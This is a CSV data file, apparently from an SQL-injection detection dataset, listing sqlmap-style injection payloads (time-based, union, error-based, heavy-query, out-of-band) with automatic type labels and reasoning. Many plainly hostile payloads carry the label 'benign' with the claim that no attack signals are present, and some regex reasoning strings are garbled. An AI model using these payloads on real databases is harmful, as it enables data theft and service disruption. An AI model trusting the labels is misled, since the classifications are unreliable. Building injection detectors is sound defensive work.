id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25477,"1 ) where 9724 = 9724 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25478,"-2149"" ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( ""hoon"" like ""hoon",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25479,"-4513"" ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""gytb"" = ""gytb",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25480,"1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) # tcrm",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25481,"1"" ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25482,waitfor delay '0:0:5' and ( 4614 = 4614,time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
25483,"1' ) as bxae where 4143 = 4143 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
25484,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'vmuj' like 'vmuj",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25485,"1' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 'zizo' like 'zizo",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25486,1 and sleep ( 5 ),time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25487,"-5595"" ) ) as xttj where 4562 = 4562 union all select 4562,4562,4562,4562,4562#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25488,"1"" ) union all select null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25489,1' where 1692 = 1692,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25490,"1 ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25491,"1 ) where 5333 = 5333 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25492,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( 'hmsu' = 'hmsu",time_blind,oracle,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25493,1 ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 5333 = 5333,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25494,"1, ( select ( case when ( 5141 = 5141 ) then ( ascii ( regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ) else 5141/ ( select 0 from ( values ( 0 ) ) ) end ) from ( values ( 0 ) ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25495,"1"" where 6686 = 6686 or elt ( 6272 = 6272,sleep ( 5 ) ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25496,"1'|| ( select 'pnsw' where 2103 = 2103 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25497,"1'+ ( select vvet where 5221 = 5221 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25498,"1 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) # jcdh",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25499,1' ) as gxfu where 9676 = 9676,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25500,"1' where 2025 = 2025 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25501,-3297' or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25502,"1 ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 6829 = 6829",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
25503,"-5231%"" or 4945 = 8402#",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25504,1' ) as yqld where 2489 = 2489,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25505,1' and sleep ( 5 ) and 'pfgy' = 'pfgy,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25506,"-5160' ) union all select 8067,8067,8067,8067,8067,8067,8067--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25507,"1' ) ) as eleh where 1347 = 1347 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25508,"-8205' or elt ( 6581 = 3480,3480 ) and 'sosv' = 'sosv",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25509,"1"" ) ) as dooq where 7911 = 7911",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25510,"-6965' ) union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25511,1' ) ) as yefv where 4263 = 4263,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25512,"1%"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""%"" = """,time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25513,1'+ ( select bfeq where 3445 = 3445 and 9198 = 9198--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25514,"-6870"" ) as deox where 8198 = 8198 union all select 8198#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25515,"1 where 2031 = 2031 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25516,"-6020'+ ( select isrz where 2489 = 2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25517,"1%' ) ) union all select null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25518,( select ( case when ( 1421 = 1421 ) then 1 else 1421* ( select 1421 from master..sysdatabases ) end ) ),benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25519,1' where 9206 = 9206,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25520,1'+ ( select tafk where 9652 = 9652,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25521,"1',iif ( 4861 = 6268,1,1/0 )",unknown,generic,0.50,Insufficient information to classify,1
25522,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 'pshn' like 'pshn",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25523,"1'+ ( select 'zkum' where 5161 = 5161 union all select null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25524,"1'|| ( select 'dpce' from dual where 5261 = 5261 union all select null,null,null,null,null,null--",union_based,oracle,0.75,Signal match: union (all )?select → union_based (P7),1
25525,"-9445 ) as dmur where 4371 = 4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25526,-9660 ) ) or 9762 = 9698,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25527,"1 where 9083 = 9083 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25528,"1"" ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""bfko"" = ""bfko",out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
25529,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ""%"" = """,heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25530,"1 ) ) as midl where 9046 = 9046 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25531,1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'qiau' = 'qiau,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25532,1 where 9393 = 9393 waitfor delay '0:0:5'--,time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
25533,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5# pdyo",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25534,"1%' union all select null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25535,"1%"" and sleep ( 5 ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25536,"1%' ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25537,"1%' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and '%' = '",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25538,"-4869%' union all select 5729,5729,5729--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25539,"1' ) and make_set ( 8403 = 8403,8899 )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25540,-8463 ) ) ) or 4861 = 9834#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25541,"1%' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( '%' = '",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
25542,"1' ) where 8252 = 8252 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25543,"1 ) ) union all select null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
